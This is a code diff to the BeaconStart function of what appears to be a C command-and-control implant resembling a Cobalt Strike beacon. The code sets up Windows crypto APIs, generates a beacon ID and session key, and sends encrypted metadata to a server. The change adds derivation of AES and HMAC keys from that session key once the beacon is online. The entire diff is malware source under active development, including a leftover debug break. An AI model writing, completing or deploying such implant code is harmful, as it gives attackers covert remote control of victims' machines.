@@ -26,6 +26,7 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 {
 	BEACON_INSTANCE Ins           = { 0 };
 	UCHAR           Str[MAX_PATH] = { 0 };
+	PVOID           Sum           =   0;
 	PVOID           K32           =   0;
 	PVOID           Ntl           =   0;
 
@@ -135,7 +136,7 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 		{
 			if ( CryptRsaInit( &Ins ) )
 			{
-				if ( Ins.api.CryptGenRandom( Ins.key[0].Provider, 16, Str ) )
+				if ( Ins.api.CryptGenRandom( Ins.key[0].Provider, 16, Ins.BeaconKeys ) )
 				{
 					if ((Ins.BeaconId = RandomNumber32( &Ins )))
 					{
@@ -158,7 +159,7 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 									{
 										if ((Hdr = BufferCreate( &Ins, sizeof( BEACON_METADATA_HDR ))))
 										{
-											if (!(Buf = BufferAddRaw( &Ins, Hdr, Str, 16 )))
+											if (!(Buf = BufferAddRaw( &Ins, Hdr, Ins.BeaconKeys, 16 )))
 												break; 
 											else Hdr = Buf;
 											
@@ -263,7 +264,7 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 													if ( TransportInit( &Ins ) )
 													{
 														if ( TransportSend( &Ins, Ecp, Ecl ) )
-															Ins.Online = TRUE;
+															Ins.IsOnline = TRUE;
 														else TransportFree( &Ins );
 													};
 													Ins.api.LocalFree( Ecp );
@@ -287,6 +288,44 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 			Ins.api.LocalFree( Ins.key[0].Ptr );
 		};
 
+		if ( Ins.IsOnline != FALSE )
+		{
+			if ((Sum = Sha256Sum( &Ins, Ins.BeaconKeys, 16 )))
+			{
+				struct
+				{
+					BLOBHEADER Hdr;
+					DWORD      Len;
+					UCHAR      Buf[ 16 ];
+				} AesMacKeyBuffer;
+
+				AesMacKeyBuffer.Hdr.bType    = PLAINTEXTKEYBLOB;
+				AesMacKeyBuffer.Hdr.bVersion = CUR_BLOB_VERSION;
+				AesMacKeyBuffer.Hdr.reserved = 0;
+				AesMacKeyBuffer.Hdr.aiKeyAlg = CALG_AES_128;
+				AesMacKeyBuffer.Len          = 16;
+				RtlCopyMemory( AesMacKeyBuffer.Buf, Sum, 8 );
+
+				Ins.key[1].Ptr = &AesMacKeyBuffer;
+				Ins.key[2].Ptr = &AesMacKeyBuffer;
+				Ins.key[1].Len = sizeof( AesMacKeyBuffer );
+				Ins.key[2].Len = sizeof( AesMacKeyBuffer );
+
+				if ( CryptAesInit( &Ins ) )
+				{
+					AesMacKeyBuffer.Hdr.aiKeyAlg = CALG_RC2; 
+					RtlCopyMemory( AesMacKeyBuffer.Buf, CPTR( UPTR( Sum ) + 8 ), 16 );
+
+					if ( CryptHmacInit( &Ins ) )
+					{
+						CryptHmacFree( &Ins ); __debugbreak();
+					};
+					CryptAesFree( &Ins );
+				};
+				RtlSecureZeroMemory( &AesMacKeyBuffer, sizeof( AesMacKeyBuffer ) ); Ins.api.LocalFree( Sum );
+			};
+		};
+
 		if ( Ins.Module[2] != NULL )
 			Ins.api.FreeLibrary( Ins.Module[2] );
 
@@ -297,7 +336,7 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 			Ins.api.FreeLibrary( Ins.Module[0] );
 	};
 
-	__builtin_memset( &Ins, 0, sizeof( Ins ) );
+	RtlSecureZeroMemory( &Ins, sizeof( Ins ) );
 
 	return;
 };
